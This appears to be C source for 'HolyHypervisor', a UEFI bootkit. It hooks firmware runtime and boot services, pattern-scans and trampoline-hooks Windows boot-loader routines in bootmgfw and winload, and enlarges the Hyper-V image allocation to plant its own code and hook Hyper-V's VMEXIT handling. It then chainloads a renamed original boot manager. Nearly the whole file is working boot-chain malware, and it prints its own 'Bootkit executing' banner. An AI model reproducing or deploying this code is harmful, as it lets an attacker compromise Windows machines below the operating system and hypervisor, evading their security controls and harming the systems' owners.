#include "Global.h"
#include "Graphics.h"
#include "BuildMode.h"

const UINT8 _gDriverUnloadImageCount = 1;
extern EFI_GUID gEfiGlobalVariableGuid;

EFI_SYSTEM_TABLE* mDebugST = NULL;
BOOLEAN mPostEBS = FALSE;

const UINT32 _gUefiDriverRevision = 0x200;
const UINT32 _gDxeRevision = 0x200;

CHAR8* gEfiCallerBaseName = "HolyHypervisor";

BOOLEAN HooksInstalled = FALSE;
HookInformation BlLdrLoadImageHook = { 0 };
HookInformation BlImgAllocateImageBufferHook = { 0 };
HookInformation BlMmAllocateVirtualPagesHook = { 0 };
HookInformation BlMmAllocatePagesHook = { 0 };

BOOLEAN gInsideHvLoad = FALSE;
BOOLEAN gHookingAttempted = FALSE;
BOOLEAN gHookB1 = FALSE, gHookB2 = FALSE, gHookB3 = FALSE, gHookB4 = FALSE;

UINTN gAllocatePagesCalledCount = 0;
UINTN gGetVariableCalledCount = 0;
UINTN gDOSHeaderFoundCount = 0;
UINTN gNTHeaderFoundCount = 0;
UINTN gBlLdrLoadImageFoundCount = 0;

BOOLEAN ExtendedSize = FALSE;
UINTN PatchedHyperV = FALSE;

BOOLEAN gHvAllocationDiagValid = FALSE;
VOID** gHvAllocationImageBufferArg = NULL;
VOID* gHvAllocationBaseBefore = NULL;
VOID* gHvAllocationBaseAfter = NULL;
UINTN gHvAllocationOriginalSize = 0;
UINTN gHvAllocationExpandedSize = 0;
UINTN gHvAllocationExtraSize = 0;
UINT32 gHvAllocationOriginalMemoryType = 0;
UINT32 gHvAllocationFinalMemoryType = 0;
UINT32 gHvAllocationAttributes = 0;
UINT64 gHvAllocationReturnValue = 0;

CHAR16 LoadedImages[20][64];
UINTN LoadedImageCount = 0;

#define HOLY_LOAD_DIAG_LIMIT 20

EFI_GET_VARIABLE OriginalGetVariable = NULL;
EFI_ALLOCATE_PAGES OriginalAllocatePages = NULL;

INTN StriCmp(const CHAR16* str1, const CHAR16* str2)
{
    while (*str1 && *str2)
    {
        CHAR16 c1 = (*str1 >= L'A' && *str1 <= L'Z') ? (*str1 + (L'a' - L'A')) : *str1;
        CHAR16 c2 = (*str2 >= L'A' && *str2 <= L'Z') ? (*str2 + (L'a' - L'A')) : *str2;
        if (c1 != c2)
            return c1 - c2;
        str1++;
        str2++;
    }
    return *str1 - *str2;
}

UINT64 EFIAPI HookedBlImgAllocateImageBuffer(VOID** imageBuffer, UINTN imageSize, UINT32 memoryType, const UINT32 attributes, VOID* unknown1, VOID* unknown2);
UINT64 EFIAPI HookedBlMmAllocateVirtualPages(VOID** Address, UINTN Pages, UINTN MemoryType, UINTN Attributes, UINTN Alignment);

EFI_STATUS HookedBlLdrLoadImage(VOID* arg1, VOID* arg2, VOID* arg3, VOID* arg4, VOID* arg5, VOID* arg6, VOID* arg7,
    VOID* arg8, VOID* arg9, VOID* arg10, VOID* arg11, VOID* arg12, VOID* arg13, VOID* arg14,
    VOID* arg15, VOID* arg16, VOID* arg17)
{
    const EFI_STATUS status = ((EFI_STATUS(*)(VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*))BlLdrLoadImageHook.Trampoline)(
        arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12, arg13, arg14, arg15, arg16, arg17);

    if (EFI_ERROR(status))
        return status;

    CHAR16* imagePath = (CHAR16*)arg2;
    CHAR16* imageName = (CHAR16*)arg3;
    PLDR_DATA_TABLE_ENTRY entry = NULL;

    if (arg8)
        entry = *(PLDR_DATA_TABLE_ENTRY*)arg8;

    if (imageName && imagePath)
    {
        static UINTN loadDiagCount = 0;
        if (loadDiagCount < HOLY_LOAD_DIAG_LIMIT)
        {
            DebugFormat("[HOLY-LOAD] #%ld name=%s path=%s base=0x%p\n",
                loadDiagCount,
                imageName,
                imagePath,
                entry ? (VOID*)entry->ModuleBase : NULL);
            loadDiagCount++;
        }

        if (StrStr(imageName, L"hvix64.exe") != NULL || StrStr(imageName, L"hvax64.exe") != NULL || StrStr(imageName, L"hv.exe") != NULL)
        {
            if (entry && entry->ModuleBase) {
                UINT32 peSizeOfImage = 0;
                PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)entry->ModuleBase;
                if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE && dosHeader->e_lfanew > 0 && dosHeader->e_lfanew < 0x1000) {
                    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(entry->ModuleBase + dosHeader->e_lfanew);
                    if (ntHeaders->Signature == IMAGE_NT_SIGNATURE)
                        peSizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;
                }

                UINT64 allocBase = (UINT64)gHvAllocationBaseAfter;
                UINT64 allocEnd = allocBase + gHvAllocationExpandedSize;
                BOOLEAN baseMatches = (gHvAllocationDiagValid && allocBase == entry->ModuleBase);

                DebugFormat("[HOLY-DIAG] Hyper-V image observed: %s base=0x%p ExtendedSize=%d\n",
                    imageName,
                    (VOID*)entry->ModuleBase,
                    ExtendedSize);
                DebugFormat("[HOLY-DIAG] hv loader table: entrySize=0x%llX peSize=0x%X allocBase=0x%p allocEnd=0x%p\n",
                    (UINT64)entry->SizeOfImage,
                    peSizeOfImage,
                    (VOID*)allocBase,
                    (VOID*)allocEnd);
                DebugFormat("[HOLY-DIAG] hv base matches extended allocation: %a\n", baseMatches ? "YES" : "NO");
                ProcessHvImage(entry->ModuleBase, imageName);

                // .text-padding placement: PE headers are not modified and the
                // loader-table entry->SizeOfImage stays at the original value,
                // so no sync is needed here.
            }
        }
        else if (StrStr(imageName, L"winload.efi") != NULL || StrStr(imageName, L"winload.exe") != NULL)
        {
            if (entry && entry->ModuleBase) {
                UINT64 winloadBase = entry->ModuleBase;
                DebugFormat("[HOLY] winload loaded at 0x%p. Scanning allocator patterns...\n", (VOID*)winloadBase);

                UINT64 winloadAllocImage = FindPatternImage((VOID*)winloadBase, "48 89 5C 24 ? 48 89 74 24 ? 48 89 7C 24 ? 55 41 54 41 55 41 56 41 57 48 8B EC 48 83 EC ? 48 8B 31 4C 8D 7A FF 45 33 ED");
                DebugFormat("[HOLY-DIAG] winload BlImgAllocateImageBuffer pattern=0x%p\n", (VOID*)winloadAllocImage);

                if (winloadAllocImage && !gHookB2) {
                    BlImgAllocateImageBufferHook = CreateHook((VOID*)winloadAllocImage, (VOID*)HookedBlImgAllocateImageBuffer);
                    DebugFormat("[HOLY-DIAG] CreateHook winload BlImg: Enabled=%d BytesToCopy=%d\n",
                        BlImgAllocateImageBufferHook.Enabled,
                        BlImgAllocateImageBufferHook.BytesToCopy);
                    if (BlImgAllocateImageBufferHook.Enabled != -1) {
                        gHookB2 = (EnableHook(&BlImgAllocateImageBufferHook) != 0);
                        DebugFormat("[HOLY] Hooked winload BlImgAllocateImageBuffer: %d\n", gHookB2);
                    }
                }

                // Direct function-prologue match for BlMmAllocateVirtualPages.
                // Bytes at FileOffset 0xBED3C in winload.efi:
                //   48 89 5C 24 08              mov [rsp+8], rbx
                //   48 89 7C 24 10              mov [rsp+10], rdi
                //   55                          push rbp
                //   48 8D 6C 24 A9              lea rbp, [rsp-57h]
                //   48 81 EC A0 00 00 00        sub rsp, 0A0h
                //   41 BA 01 00 00 00           mov r10d, 1
                //   48 8B F9                    mov rdi, rcx
                //   44 01 15 ?? ?? ?? ??        add [rip+disp32], r10d
                UINT64 winloadAllocVirtual = FindPatternImage((VOID*)winloadBase,
                    "48 89 5C 24 08 48 89 7C 24 10 55 48 8D 6C 24 A9 48 81 EC A0 00 00 00 41 BA 01 00 00 00 48 8B F9 44 01 15");

                DebugFormat("[HOLY-DIAG] winload BlMmAllocateVirtualPages target=0x%p\n",
                    (VOID*)winloadAllocVirtual);

                if (winloadAllocVirtual && !gHookB3) {
                    BlMmAllocateVirtualPagesHook = CreateHook((VOID*)winloadAllocVirtual, (VOID*)HookedBlMmAllocateVirtualPages);
                    DebugFormat("[HOLY-DIAG] CreateHook winload BlMmVirtual: Enabled=%d BytesToCopy=%d\n",
                        BlMmAllocateVirtualPagesHook.Enabled,
                        BlMmAllocateVirtualPagesHook.BytesToCopy);
                    if (BlMmAllocateVirtualPagesHook.Enabled != -1) {
                        gHookB3 = (EnableHook(&BlMmAllocateVirtualPagesHook) != 0);
                        DebugFormat("[HOLY] Hooked winload BlMmAllocateVirtualPages: %d\n", gHookB3);
                    }
                }
            }
        }
    }

    // Silent counting only - no serial output to avoid boot timing issues
    static UINTN loadCount = 0;
    loadCount++;
    HooksInstalled = (gHookB1 && (gHookB2 || gHookB3));

    return status;
}

UINT64 EFIAPI HookedBlImgAllocateImageBuffer(VOID** imageBuffer, UINTN imageSize, UINT32 memoryType, const UINT32 attributes, VOID* unknown1, VOID* unknown2)
{
    /*
     * First one with this type is the actual allocation:
     * BlImgAllocateImageBuffer(): 0xFFFFF806387AA000 (4276224) (147456)
     * BlLdrLoadImage(): \WINDOWS\system32\hvax64.exe hv.exe 0xFFFFF806387AA000 (4276224)
     * BlImgAllocateImageBuffer(): 0xFFFFF80638BBE000 (77824) (147456)
     * BlLdrLoadImage(): \WINDOWS\system32\hv.exe hv.exe 0xFFFFF806387AA000 (4276224)
     */
static int allocLogCount = 0;
    
    if (allocLogCount < 50) {
        DebugFormat("[HOLY-ALLOC] BlImgAllocateImageBuffer: ImageSize=%ld, MemoryType=0x%X, Attributes=0x%X\n", imageSize, memoryType, attributes);
        allocLogCount++;
    }

    BOOLEAN extendedThisCall = FALSE;
    const UINTN originalSize = imageSize;
    const UINT32 originalMemoryType = memoryType;
    const UINT32 originalAttributes = attributes;
    VOID* bufferBefore = imageBuffer ? *imageBuffer : NULL;
    UINTN currentImageSize = 0;

    if ((memoryType == 0xD0000004 || attributes == ATTRIBUTE_HV_IMAGE) && imageSize >= 0x200000 && !ExtendedSize)
    {
        ExtendedSize = TRUE;
        extendedThisCall = TRUE;
#if 1
        currentImageSize = GetCurrentImageSize();
        imageSize += currentImageSize;
        // memoryType intentionally kept as-is: changing it to MEMORY_ATTRIBUTE_RWX
        // reclassifies the extended pages as EfiBootServicesData, causing them to be
        // freed after ExitBootServices before Hyper-V executes the hooked VMEXIT handler.

        DebugFormat("[HOLY] Extended BlImgAllocateImageBuffer for 0x%p from %ld to %ld (+%ld)\n", imageBuffer, originalSize, imageSize, currentImageSize);
#else
        DebugFormat("OBSERVATION MODE: Found BlImgAllocateImageBuffer for HV_IMAGE. Skipping expansion. Original size requested: %ld\n", imageSize);
#endif
    }

    const UINT64 allocated = ((UINT64(*)(VOID**, UINTN, UINT32, UINT32, VOID*, VOID*))BlImgAllocateImageBufferHook.Trampoline)(
        imageBuffer, imageSize, memoryType, attributes, unknown1, unknown2);

    if (extendedThisCall)
    {
        VOID* bufferAfter = imageBuffer ? *imageBuffer : NULL;

        gHvAllocationDiagValid = TRUE;
        gHvAllocationImageBufferArg = imageBuffer;
        gHvAllocationBaseBefore = bufferBefore;
        gHvAllocationBaseAfter = bufferAfter;
        gHvAllocationOriginalSize = originalSize;
        gHvAllocationExpandedSize = imageSize;
        gHvAllocationExtraSize = currentImageSize;
        gHvAllocationOriginalMemoryType = originalMemoryType;
        gHvAllocationFinalMemoryType = memoryType;
        gHvAllocationAttributes = originalAttributes;
        gHvAllocationReturnValue = allocated;

        DebugFormat("[HOLY-DIAG] extended buffer arg=0x%p before=0x%p after=0x%p ret=0x%p\n",
            (VOID*)imageBuffer,
            bufferBefore,
            bufferAfter,
            (VOID*)allocated);
        DebugFormat("[HOLY-DIAG] extended buffer sizes: original=0x%llX expanded=0x%llX extra=0x%llX memType 0x%X->0x%X attr=0x%X\n",
            (UINT64)gHvAllocationOriginalSize,
            (UINT64)gHvAllocationExpandedSize,
            (UINT64)gHvAllocationExtraSize,
            gHvAllocationOriginalMemoryType,
            gHvAllocationFinalMemoryType,
            gHvAllocationAttributes);
    }

    return allocated;
}

static int virtualAllocLogCount = 0;
UINT64 EFIAPI HookedBlMmAllocateVirtualPages(VOID** Address, UINTN Pages, UINTN MemoryType, UINTN Attributes, UINTN Alignment)
{
    if (virtualAllocLogCount < 50) {
        DebugFormat("[HOLY-ALLOC] BlMmAllocateVirtualPages: Pages=%ld, MemoryType=0x%X, Attributes=0x%X\n", Pages, MemoryType, Attributes);
        virtualAllocLogCount++;
    }

    // Temporarily using MemoryType == 0xD0000004 or Attributes == ATTRIBUTE_HV_IMAGE to see which one works
    if ((MemoryType == 0xD0000004 || Attributes == ATTRIBUTE_HV_IMAGE) && Pages >= (0x200000 >> 12) && !ExtendedSize) {
        ExtendedSize = TRUE;
#if 1
        UINT32 pageCount = (UINT32)Pages;
        UINT32 extraPages = (UINT32)((GetCurrentImageSize() + 0xFFF) >> 12);
        Pages = (Pages & 0xFFFFFFFF00000000ULL) | (pageCount + extraPages);
        MemoryType = (MemoryType & 0xFFFFFFFF00000000ULL) | MEMORY_ATTRIBUTE_RWX;
        DebugFormat("[HOLY] Extended BlMmAllocateVirtualPages from %ld to %ld pages\n", pageCount, (UINT32)Pages);
#else
        DebugFormat("OBSERVATION MODE: Found BlMmAllocateVirtualPages for HV_IMAGE. Skipping expansion. Original Pages requested: %ld\n", (UINT32)Pages);
#endif
    }
    return ((UINT64(*)(VOID**, UINTN, UINTN, UINTN, UINTN))BlMmAllocateVirtualPagesHook.Trampoline)(Address, Pages, MemoryType, Attributes, Alignment);
}

static int allocPagesLogCount = 0;
UINT64 EFIAPI HookedBlMmAllocatePages(VOID** Address, UINTN Pages, UINTN MemoryType, UINTN Attributes, UINTN Alignment)
{
    if (allocPagesLogCount < 50) {
        DebugFormat("[HOLY-ALLOC] BlMmAllocatePages: Pages=%ld, MemoryType=0x%X, Attributes=0x%X\n", Pages, MemoryType, Attributes);
        allocPagesLogCount++;
    }

    if ((MemoryType == 0xD0000004 || Attributes == ATTRIBUTE_HV_IMAGE) && Pages >= (0x200000 >> 12) && !ExtendedSize) {
        ExtendedSize = TRUE;
#if 1
        UINT32 pageCount = (UINT32)Pages;
        UINT32 extraPages = (UINT32)((GetCurrentImageSize() + 0xFFF) >> 12);
        Pages = (Pages & 0xFFFFFFFF00000000ULL) | (pageCount + extraPages);
        MemoryType = (MemoryType & 0xFFFFFFFF00000000ULL) | MEMORY_ATTRIBUTE_RWX;
#else
        DebugFormat("OBSERVATION MODE: Found BlMmAllocatePages for HV_IMAGE. Skipping expansion. Original Pages requested: %ld\n", (UINT32)Pages);
#endif
    }
    return ((UINT64(*)(VOID**, UINTN, UINTN, UINTN, UINTN))BlMmAllocatePagesHook.Trampoline)(Address, Pages, MemoryType, Attributes, Alignment);
}

EFI_STATUS EFIAPI HookedAllocatePages(EFI_ALLOCATE_TYPE Type, EFI_MEMORY_TYPE MemoryType, UINTN Pages, EFI_PHYSICAL_ADDRESS *Memory)
{
    gAllocatePagesCalledCount++;
    return OriginalAllocatePages(Type, MemoryType, Pages, Memory);
}

EFI_STATUS EFIAPI HookedGetVariable(CHAR16* variableName, EFI_GUID* vendorGuid, UINT32* attributes, UINTN* dataSize, VOID* data)
{
    gGetVariableCalledCount++;
    if (mPostEBS)
        return OriginalGetVariable(variableName, vendorGuid, attributes, dataSize, data);

    if (HooksInstalled && (gHookB2 || gHookB3))
        return OriginalGetVariable(variableName, vendorGuid, attributes, dataSize, data);

    UINT64 returnAddress = (UINT64)_ReturnAddress();
    UINT64 moduleBase = 0;

    BOOLEAN shouldScan = FALSE;
    if (!mPostEBS && variableName) {
        if (StriCmp(variableName, L"SecureBoot") == 0 ||
            StriCmp(variableName, L"SetupMode") == 0 ||
            StriCmp(variableName, L"BootCurrent") == 0 ||
            StriCmp(variableName, L"BootOrder") == 0 ||
            StriCmp(variableName, L"OslpHvix64") == 0 ||
            StriCmp(variableName, L"Oslp") == 0 ||
            StriCmp(variableName, L"OslpMain") == 0)
        {
            shouldScan = TRUE;
        }
    }

    if (shouldScan) {
        UINT64 searchBase = returnAddress & 0xFFFFFFFFFFFFF000;
        UINTN scanned = 0;
        while (scanned < 0x2000) {
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)searchBase;
            if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
                // Basic validation of PE header
                if (dos->e_lfanew > 0 && dos->e_lfanew < 0x1000) {
                    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(searchBase + dos->e_lfanew);
                    if (nt->Signature == IMAGE_NT_SIGNATURE) {
                        gNTHeaderFoundCount++;
                        // ISOLATION TEST STEP 5: Safe Scan
                        // Break immediately when MZ/NT header is found!
                        // Do NOT scan further backwards into unmapped memory.
                        moduleBase = searchBase;
                        break;
                    }
                }
            }
            searchBase -= 0x1000;
            scanned++;
        }
    }

    if (!moduleBase) {
        return OriginalGetVariable(variableName, vendorGuid, attributes, dataSize, data);
    }

    const UINT64 loadImage = GetExport((VOID*)moduleBase, "BlLdrLoadImage");
    
    if (!loadImage) {
        return OriginalGetVariable(variableName, vendorGuid, attributes, dataSize, data);
    }

    static UINT64 processedModules[10] = {0};
    BOOLEAN alreadyProcessed = FALSE;
    for (int i = 0; i < 10; i++) {
        if (processedModules[i] == moduleBase) {
            alreadyProcessed = TRUE;
            break;
        }
    }
    if (alreadyProcessed) {
        return OriginalGetVariable(variableName, vendorGuid, attributes, dataSize, data);
    }

    // Add to processed array
    for (int i = 0; i < 10; i++) {
        if (processedModules[i] == 0) {
            processedModules[i] = moduleBase;
            break;
        }
    }

    DebugFormat("[HOLY] Processing module at 0x%p for variable %s\n", moduleBase, variableName);

    // Hook internal functions for this module unconditionally!
    DebugFormat("[HOLY] Hooking module internal functions!\n");
    
    UINT64 allocImage = FindPatternImage((VOID*)moduleBase, "48 89 5C 24 ? 48 89 74 24 ? 48 89 7C 24 ? 55 41 54 41 55 41 56 41 57 48 8B EC 48 83 EC ? 48 8B 31 4C 8D 7A FF 45 33 ED");
    if (allocImage && !gHookB2) {
        BlImgAllocateImageBufferHook = CreateHook((VOID*)allocImage, (VOID*)HookedBlImgAllocateImageBuffer);
        if (BlImgAllocateImageBufferHook.Enabled != -1) {
            gHookB2 = (EnableHook(&BlImgAllocateImageBufferHook) != 0);
            DebugFormat("[HOLY] Hooked BlImgAllocateImageBuffer: %d\n", gHookB2);
        }
    }
    
    // Direct function-prologue match for BlMmAllocateVirtualPages (FileOffset 0xBED3C
    // in winload.efi). The previous CALL-site pattern + bogus "+13 + *(INT32*)(+9)"
    // math no longer matches this winload build.
    UINT64 allocVirtual = FindPatternImage((VOID*)moduleBase,
        "48 89 5C 24 08 48 89 7C 24 10 55 48 8D 6C 24 A9 48 81 EC A0 00 00 00 41 BA 01 00 00 00 48 8B F9 44 01 15");
    DebugFormat("[HOLY] BlMmAllocateVirtualPages prologue scan target=0x%p\n", (VOID*)allocVirtual);
    if (allocVirtual && !gHookB3) {
        BlMmAllocateVirtualPagesHook = CreateHook((VOID*)allocVirtual, (VOID*)HookedBlMmAllocateVirtualPages);
        if (BlMmAllocateVirtualPagesHook.Enabled != -1) {
            gHookB3 = (EnableHook(&BlMmAllocateVirtualPagesHook) != 0);
            DebugFormat("[HOLY] Hooked BlMmAllocateVirtualPages: %d\n", gHookB3);
        }
    }

    // Hook BlLdrLoadImage (for both bootmgfw and winload)
    if (!gHookB1) {
        DebugFormat("[HOLY] Hooking BlLdrLoadImage...\n");
        BlLdrLoadImageHook = CreateHook((VOID*)loadImage, (VOID*)HookedBlLdrLoadImage);
        if (BlLdrLoadImageHook.Enabled == -1) {
            gHookB1 = FALSE;
        } else {
            gHookB1 = (EnableHook(&BlLdrLoadImageHook) != 0);
        }
    }

    HooksInstalled = (gHookB1 && (gHookB2 || gHookB3));

    // Single minimal summary line
    DebugFormat("[HOLY] Hooks B1:%d B2:%d B3:%d Installed:%d Extended:%d\n", gHookB1, gHookB2, gHookB3, HooksInstalled, ExtendedSize);

    return OriginalGetVariable(variableName, vendorGuid, attributes, dataSize, data);
}

VOID* SetServicePointer(EFI_TABLE_HEADER* serviceTableHeader, VOID** serviceTableFunction, VOID* newFunction)
{
    if (!serviceTableFunction || !newFunction || !*serviceTableFunction)
        return NULL;

    ASSERT(gBS != NULL);
    ASSERT(gBS->CalculateCrc32 != NULL);

    CONST EFI_TPL tpl = gBS->RaiseTPL(TPL_HIGH_LEVEL);

    VOID* originalFunction = *serviceTableFunction;
    *serviceTableFunction = newFunction;

    serviceTableHeader->CRC32 = 0;
    gBS->CalculateCrc32((UINT8*)serviceTableHeader, serviceTableHeader->HeaderSize, &serviceTableHeader->CRC32);

    gBS->RestoreTPL(tpl);

    return originalFunction;
}

EFI_STATUS EFIAPI UefiUnload(const EFI_HANDLE imageHandle)
{
    UNREFERENCED_PARAMETER(imageHandle);
    return EFI_ACCESS_DENIED;
}

EFI_EXIT_BOOT_SERVICES OriginalExitBootServices = NULL;

EFI_STATUS EFIAPI HookedExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey)
{
    mPostEBS = TRUE;
    
    // Restore original UEFI pointers before Windows takes over!
    // If we leave our pointers in the Runtime/Boot tables, Windows will call our freed memory and crash!
    if (OriginalGetVariable) {
        SetServicePointer(&gRT->Hdr, (VOID**)&gRT->GetVariable, (VOID*)OriginalGetVariable);
    }
    if (OriginalAllocatePages) {
        SetServicePointer(&gBS->Hdr, (VOID**)&gBS->AllocatePages, (VOID*)OriginalAllocatePages);
    }
    if (OriginalExitBootServices) {
        SetServicePointer(&gBS->Hdr, (VOID**)&gBS->ExitBootServices, (VOID*)OriginalExitBootServices);
    }

    return OriginalExitBootServices(ImageHandle, MapKey);
}

EFI_STATUS EFIAPI UefiMain(const EFI_HANDLE imageHandle, EFI_SYSTEM_TABLE* systemTable)
{
    gST = systemTable;
    gBS = systemTable->BootServices;
    gRT = systemTable->RuntimeServices;

    // VERY FIRST THING: Initialize Debug to ensure logs are always captured
    DebugInit(COM1);
    DebugFormat("[HOLY] Start - Build Marker: %a\n", HOLY_BUILD_MARKER);

    // DIAGNOSTICS: Wait 3 seconds to allow PuTTY to connect via named pipe and catch the logs!
    gST->ConOut->ClearScreen(gST->ConOut);
    gST->ConOut->OutputString(gST->ConOut, L"[HOLY] Bootkit executing with minimal logging...\r\n");
    gBS->Stall(3000000);

    // Disable graphics hook to isolate crash
    // InstallGraphicsHook();
    // gST->ConOut->OutputString(gST->ConOut, L"[HOLY] Graphics hook installed.\r\n");

    // ENABLE service hooks to test the safe memory scan
    OriginalGetVariable = (EFI_GET_VARIABLE)SetServicePointer(&gRT->Hdr, (VOID**)&gRT->GetVariable, (VOID*)HookedGetVariable);
    OriginalAllocatePages = (EFI_ALLOCATE_PAGES)SetServicePointer(&gBS->Hdr, (VOID**)&gBS->AllocatePages, (VOID*)HookedAllocatePages);
    OriginalExitBootServices = (EFI_EXIT_BOOT_SERVICES)SetServicePointer(&gBS->Hdr, (VOID**)&gBS->ExitBootServices, (VOID*)HookedExitBootServices);
    DebugFormat("GetVariable(): 0x%p -> 0x%p\n", OriginalGetVariable, HookedGetVariable);

    EFI_LOADED_IMAGE_PROTOCOL *MyImage = NULL;
    EFI_STATUS Status = gBS->HandleProtocol(imageHandle, &gEfiLoadedImageProtocolGuid, (VOID**)&MyImage);
    if (EFI_ERROR(Status) || !MyImage) {
        gBS->Stall(5000000);
        return Status;
    }

    static const CHAR16 OrigPath[] = L"\\EFI\\Microsoft\\Boot\\bootmgfw_orig.efi";
    
    // Manual FileDevicePath construction
    UINTN DevLen = 0;
    EFI_DEVICE_PATH_PROTOCOL *Dp = NULL;
    Status = gBS->HandleProtocol(MyImage->DeviceHandle, &gEfiDevicePathProtocolGuid, (VOID**)&Dp);
    
    if (!EFI_ERROR(Status) && Dp != NULL) {
        EFI_DEVICE_PATH_PROTOCOL *Curr = Dp;
        while (!(Curr->Type == 0x7F && Curr->SubType == 0xFF)) {
            UINTN NodeLen = (Curr->Length[1] << 8) | Curr->Length[0];
            if (NodeLen < 4) break;
            DevLen += NodeLen;
            Curr = (EFI_DEVICE_PATH_PROTOCOL*)((UINT8*)Curr + NodeLen);
        }
    }
    
    UINTN NameLen = StrLen(OrigPath) + 1;
    UINTN FileNodeLen = 4 + NameLen * sizeof(CHAR16);
    UINTN TotalLen = DevLen + FileNodeLen + 4;
    
    UINT8 *Buf = NULL;
    Status = gBS->AllocatePool(EfiBootServicesData, TotalLen, (VOID**)&Buf);
    if (EFI_ERROR(Status)) {
        gBS->Stall(5000000);
        return Status;
    }
    
    UINT8 *Ptr = Buf;
    if (DevLen > 0) {
        CopyMem(Ptr, Dp, DevLen);
        Ptr += DevLen;
    }
    
    // File node
    EFI_DEVICE_PATH_PROTOCOL *FileNode = (EFI_DEVICE_PATH_PROTOCOL*)Ptr;
    FileNode->Type = 4; // MEDIA_DEVICE_PATH
    FileNode->SubType = 4; // MEDIA_FILEPATH_DP
    FileNode->Length[0] = (UINT8)(FileNodeLen & 0xFF);
    FileNode->Length[1] = (UINT8)((FileNodeLen >> 8) & 0xFF);
    CopyMem(Ptr + 4, OrigPath, NameLen * sizeof(CHAR16));
    Ptr += FileNodeLen;
    
    // End node
    EFI_DEVICE_PATH_PROTOCOL *End = (EFI_DEVICE_PATH_PROTOCOL*)Ptr;
    End->Type = 0x7F; // END_DEVICE_PATH_TYPE
    End->SubType = 0xFF; // END_ENTIRE_DEVICE_PATH
    End->Length[0] = 4;
    End->Length[1] = 0;

    EFI_DEVICE_PATH_PROTOCOL *OrigDp = (EFI_DEVICE_PATH_PROTOCOL*)Buf;

    EFI_HANDLE OrigHandle = NULL;
    Status = gBS->LoadImage(TRUE, imageHandle, OrigDp, NULL, 0, &OrigHandle);
    
    FreePool(OrigDp);

    if (EFI_ERROR(Status) || !OrigHandle) {
        DebugFormat("Failed to load original boot manager: %r\n", Status);
        gBS->Stall(5000000);
        return Status;
    }

    gST->ConOut->OutputString(gST->ConOut, L"[HOLY] Starting original boot manager...\r\n");
    UINTN ExitDataSize = 0;
    CHAR16 *ExitData = NULL;
    Status = gBS->StartImage(OrigHandle, &ExitDataSize, &ExitData);

    return Status;
}
